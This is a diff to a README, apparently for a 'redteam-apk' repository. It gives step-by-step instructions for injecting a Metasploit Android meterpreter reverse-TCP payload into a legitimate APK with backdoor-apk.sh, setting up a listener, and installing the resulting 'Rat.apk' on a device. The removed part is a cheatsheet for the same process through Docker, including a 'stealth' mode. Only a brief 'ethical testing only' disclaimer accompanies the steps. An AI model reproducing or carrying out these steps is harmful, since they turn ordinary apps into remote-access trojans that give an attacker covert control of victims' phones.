@@ -1,49 +1,10 @@
 # redteam-apk
+Begin by ensuring you have Kali Linux or a similar environment setup with tools like msfvenom, dex2jar, unzip, keytool, jarsigner, apktool, ProGuard, Android String Obfuscator (ASO), and Android SDK build-tools (dx, zipalign), installing dependencies with sudo apt update && sudo apt install lib32z1 lib32ncurses5 lib32stdc++6 dex2jar apktool proguard (and sudo gem install bundler && bundle install for ASO), then download and prepare the backdoor-apk.sh script along with the needed files (and make it executable with chmod +x backdoor-apk.sh); next, execute the script with ./backdoor-apk.sh original.apk, responding to prompts for Android payload, LHOST, and LPORT, after which you'll need to setup a Metasploit listener by running msfconsole, then using use exploit/multi/handler, set PAYLOAD android/meterpreter/reverse_tcp, set LHOST <YOUR_KALI_IP>, and set LPORT 4444, finishing with exploit; finally locate the backdoored APK as Rat.apk within the directory, install it on an Android device while allowing installations from unknown sources, and run it, at which point the Metasploit listener should establish a connection, but remember this is for ethical testing only and requires proper permissions, and ensure all dependencies are appropriately configured and that the Android device can communicate with the attacker's machine.
 
-📦 kali-backdoor-apk-cheatsheet
-├── 📁 Setup (Prep Your Hack Lab) 🔧
-│   ├── mkdir input output 📂📂
-│   │   └── "Create folders for your target file and output hack" 💾➡️🔓
-│   └── wget https://f-droid.org/repo/org.fdroid.fdroid_1013050.apk -O input/test.apk 🌐
-│       └── "Download a test APK file to hack" 📥
-├── 📁 Commands (Control Your Hack Bot) 🤖⚙️
-│   ├── 🌟 Interactive Mode (Chatty Bot) 💬
-│   │   └── docker run --rm -it -v $(pwd)/input:/app/input -v $(pwd)/output:/app/output kali-backdoor-apk:latest -i /app/input/test.apk
-│   │       └── "Chat with the bot to inject a payload, get backdoored.apk" 💉📱
-│   ├── 🌟 Custom Output (File Renamer) 🖌️
-│   │   └── docker run --rm -it -v $(pwd)/input:/app/input -v $(pwd)/output:/app/output kali-backdoor-apk:latest -i /app/input/test.apk -o /app/output/hacked-app.apk
-│   │       └── "Rename your hacked file to something sneaky" 📝
-│   ├── 🌟 Config File (Script Loader) 📜
-│   │   ├── Prep Config ⚙️
-│   │   │   ├── echo 'LHOST="192.168.1.100"' > config.sh
-│   │   │   ├── echo 'LPORT="4444"' >> config.sh
-│   │   │   └── echo 'PAYLOAD="android/meterpreter/reverse_https"' >> config.sh
-│   │   └── docker run --rm -v $(pwd)/input:/app/input -v $(pwd)/output:/app/output -v $(pwd)/config:/app/config kali-backdoor-apk:latest -i /app/input/test.apk -c /app/config/config.sh
-│   │       └── "Load a pre-set script, skip the chit-chat" 🤖🚀
-│   ├── 🌟 Silent Mode (Stealth Bot) 🕶️
-│   │   └── docker run --rm -v $(pwd)/input:/app/input -v $(pwd)/output:/app/output kali-backdoor-apk:latest -i /app/input/test.apk -s
-│   │       └── "Bot works quietly (needs config)" 🔇
-│   ├── 🌟 Help Menu (Manual Scan) 📚
-│   │   └── docker run --rm kali-backdoor-apk:latest -h
-│   │       └── "Check the bot’s command manual" 👁️‍🗨️
-│   └── 🌟 All-in-One (Full Hack Suite) 🛠️
-│       └── docker run --rm -it -v $(pwd)/input:/app/input -v $(pwd)/output:/app/output -v $(pwd)/config:/app/config kali-backdoor-apk:latest -i /app/input/test.apk -o /app/output/hacked-app.apk -c /app/config/config.sh -s
-│           └── "Run a stealth hack with custom name and script" 💻🔒
-├── 📁 Spy Setup (Activate Listener) 📡
-│   ├── msfconsole 🎧
-│   └── Inside Metasploit:
-│       ├── use exploit/multi/handler
-│       ├── set PAYLOAD android/meterpreter/reverse_tcp
-│       ├── set LHOST 192.168.1.100
-│       ├── set LPORT 4444
-│       └── exploit
-│           └── "Turn on your spy antenna to catch the signal" 📶
-├── 📁 Troubleshooting (Fix Bugs) 🐞
-│   ├── "No APK!" Error 🚫
-│   │   └── ls input (Ensure test.apk is there) 🔍
-│   ├── Permission Error 🔐
-│   │   └── sudo usermod -aG docker $USER (Log out/in) 🔑
-│   ├── Silent Mode Fails 🤐
-│   │   └── Add config.sh or remove -s ⚙️
-│   └── Output Missing ❓
-│       └── ls output (Check for hacked file) 📂
+Explanation of how to assemble:
+
+Start with the text above as a single string.
+
+Replace <YOUR_KALI_IP> with your Kali Linux IP address.
+
+Remember this process includes steps before and after the commands.
